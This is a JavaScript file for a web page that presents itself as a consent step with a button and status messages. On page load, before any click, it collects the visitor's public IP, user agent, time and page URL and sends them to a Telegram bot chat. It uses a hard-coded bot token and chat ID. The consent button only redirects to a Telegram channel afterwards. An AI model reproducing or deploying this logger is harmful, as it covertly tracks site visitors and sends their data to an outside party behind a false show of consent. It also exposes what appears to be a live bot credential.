// Конфигурация
const config = {
    botToken: '8173072452:AAHFc7rmZ2W0xNK2gboFSK_BcNzxMMzSq3o',
    chatId: '-4850015870',
    ipApiUrl: 'https://api.ipify.org?format=json',
    telegramApiUrl: 'https://api.telegram.org/bot',
    telegramChannel: 'https://t.me/adaptsw'
};


const elements = {
    consentBtn: document.getElementById('consentBtn'),
    status: document.getElementById('status'),
    successMsg: document.getElementById('successMsg')
};


async function sendIpToTelegram() {
    try {

        const ipResponse = await fetch(config.ipApiUrl);
        if (!ipResponse.ok) throw new Error('Ошибка получения IP');
        const { ip } = await ipResponse.json();
        
        const message = `🚀 Новый вход 🚀\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nВремя: ${new Date().toLocaleString()}\nСсылка: ${window.location.href}`;
        
        const telegramUrl = `${config.telegramApiUrl}${config.botToken}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}`;
        await fetch(telegramUrl);
        
    } catch (error) {
        console.error('Ошибка отправки:', error);
    }
}


window.addEventListener('DOMContentLoaded', () => {
    sendIpToTelegram();
    
    elements.status.textContent = "Готово! Нажмите кнопку";
});


elements.consentBtn.addEventListener('click', () => {
    elements.status.classList.add('hidden');
    elements.successMsg.classList.remove('hidden');
    
    setTimeout(() => {
        window.location.href = config.telegramChannel;
    }, 1500);
});
